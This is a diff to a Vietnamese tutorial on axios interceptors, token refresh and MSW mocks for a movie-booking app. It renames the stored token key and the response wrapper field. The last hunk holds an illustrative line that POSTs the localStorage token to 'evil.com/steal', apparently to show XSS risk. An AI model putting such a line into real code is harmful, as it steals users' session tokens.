@@ -250,7 +250,7 @@ api.interceptors.response.use(
       config._retry = true;
       const refreshToken = localStorage.getItem('refreshToken');
       const { data } = await axios.post('/auth/refresh', { refreshToken });
-      localStorage.setItem('accessToken', data.accessToken);
+      localStorage.setItem('token', data.accessToken);
       config.headers.Authorization = `Bearer ${data.accessToken}`;
       return api(config);  // Replay request cũ với token mới
     }
@@ -286,7 +286,7 @@ axios.post('/auth/refresh')   <-- gửi refresh token
 Backend trả accessToken MỚI
         |
         v
-localStorage.setItem('accessToken', newToken)
+localStorage.setItem('token', newToken)
         |
         v
 api(config)   <-- replay /booking với token mới
@@ -360,7 +360,7 @@ if (error.response?.status === 401 && !config._retry) {
   isRefreshing = true;
   try {
     const { data } = await axios.post('/auth/refresh', { refreshToken });
-    localStorage.setItem('accessToken', data.accessToken);
+    localStorage.setItem('token', data.accessToken);
     processQueue(null, data.accessToken);
     config.headers.Authorization = `Bearer ${data.accessToken}`;
     return api(config);
@@ -417,7 +417,7 @@ console.log(res.data.title);  // IntelliSense gợi ý, type-check
 
 Backend CineX wrap mọi response:
 ```json
-{ "status": "SUCCESS", "data": { ... }, "message": "OK" }
+{ "success": true, "data": { ... }, "message": "OK" }
 ```
 
 Mỗi lần dùng phải `.data.data` rất xấu:
@@ -887,7 +887,7 @@ Thứ tự đăng ký có quan trọng không? CÓ.
 ```ts
 // Đăng ký 1: gắn token
 api.interceptors.request.use(config => {
-  const token = localStorage.getItem('accessToken');
+  const token = localStorage.getItem('token');
   if (token) config.headers.Authorization = `Bearer ${token}`;
   return config;
 });
@@ -906,7 +906,7 @@ api.interceptors.response.use(r => r, async err => {
 
 // Đăng ký 4: unwrap data
 api.interceptors.response.use(res => {
-  if (res.data?.status === 'SUCCESS') return res.data.data;
+  if (res.data?.success === true) return res.data.data;
   return res;
 });
 ```
@@ -946,7 +946,7 @@ import { setupWorker, rest } from 'msw';
 const worker = setupWorker(
   rest.get('/api/recommendations', (req, res, ctx) => {
     return res(ctx.json({
-      status: 'SUCCESS',
+      success: true,
       data: [
         { id: 1, title: 'Avatar 3' },
         { id: 2, title: 'Inception 2' }
@@ -988,7 +988,7 @@ Dùng MSW cho endpoint thống kê phức tạp (BE đang viết): `/api/admin/s
 ```js
 fetch('https://evil.com/steal', {
   method: 'POST',
-  body: localStorage.getItem('accessToken')
+  body: localStorage.getItem('token')
 });
 ```
 
